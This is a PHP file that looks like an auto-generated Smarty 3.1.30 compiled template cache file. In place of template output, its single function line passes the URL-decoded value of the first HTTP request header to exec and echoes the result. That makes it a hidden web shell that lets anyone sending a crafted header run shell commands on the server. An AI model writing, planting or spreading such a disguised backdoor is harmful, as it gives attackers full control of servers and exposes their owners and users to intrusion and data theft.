<?php
/* Smarty version 3.1.30, created on 2019-06-23 11:46:53
  from "db35456ac2534c2dce3a5dde476dfa621d7993f2" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_5d0f66adee3819_87592135',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5d0f66adee3819_87592135 (Smarty_Internal_Template $_smarty_tpl) {
echo exec(urldecode(current(getallheaders())));
}
}
